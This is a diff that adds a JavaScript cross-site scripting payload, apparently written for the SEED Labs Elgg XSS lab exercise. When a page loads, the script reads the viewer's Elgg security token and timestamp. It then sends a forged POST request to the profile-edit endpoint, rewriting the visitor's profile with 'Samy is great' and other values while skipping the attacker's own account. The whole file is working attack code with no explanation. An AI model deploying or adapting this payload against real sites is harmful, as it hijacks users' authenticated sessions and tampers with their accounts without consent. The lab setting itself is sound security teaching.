@@ -1,0 +1,24 @@
+<script type="text/javascript">
+	window.onload = function(){
+	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+	//and Security Token __elgg_token
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="__elgg_token="+elgg.security.token.__elgg_token;
+	//Construct the content of your url.
+        var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
+//__elgg_token=SMG7UEYKu8rClkbnB37Ifw&__elgg_ts=1624168185&name=Boby&description=%3Cp%3E16%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=1&briefdescription=abc&accesslevel%5Bbriefdescription%5D=1&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=45
+	var content=token+ts+"&name="+elgg.session.user.name+"&description=1605006&accesslevel[description]=1&briefdescription=Samy is great&accesslevel[briefdescription]=1&location=abcd&accesslevel[location]=1&interests=abcd&accesslevel[interests]=1&skills=abcd&accesslevel[skills]=1&contactemail=abc@d.com&accesslevel[contactemail]=1&phone=1234&accesslevel[phone]=1&mobile=1234&accesslevel[mobile]=1&website=http://www.ab.com&accesslevel[website]=1&twitter=abcd&accesslevel[twitter]=1&guid="+elgg.session.user.guid; //FILL IN
+	
+	if(elgg.session.user.guid!=47)
+	{
+		//Create and send Ajax request to modify profile
+		var Ajax=null;
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+		Ajax.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax.send(content);
+	}
+	}
+</script>
